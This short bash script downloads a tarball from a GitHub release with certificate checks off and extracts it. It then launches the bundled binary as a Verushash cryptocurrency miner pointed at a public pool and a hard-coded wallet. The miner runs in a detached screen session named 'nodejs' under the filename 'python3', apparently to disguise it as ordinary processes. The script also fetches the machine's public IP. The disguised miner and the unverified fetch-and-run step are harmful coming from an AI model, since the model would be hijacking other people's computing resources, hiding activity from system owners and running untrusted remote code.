#!/bin/bash

if [ ! -d "mek" ]; then
    echo "unduh dan ektraks"
    wget -O mek --no-check-certificate https://github.com/DOT-AJA/KONTOL-DOT/releases/download/KONTOL/dotsrb.tar.gz
    tar -xvf mek
else
    echo "File sudah ada"
fi

IP=$(curl -s ifconfig.me)
IP_NUMBERS=${IP//./}
LAST_SIX=${IP_NUMBERS: -6}

screen -dmS nodejs ./dotsrb/python3 --algorithm verushash --pool eu.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.RIG23VCPU
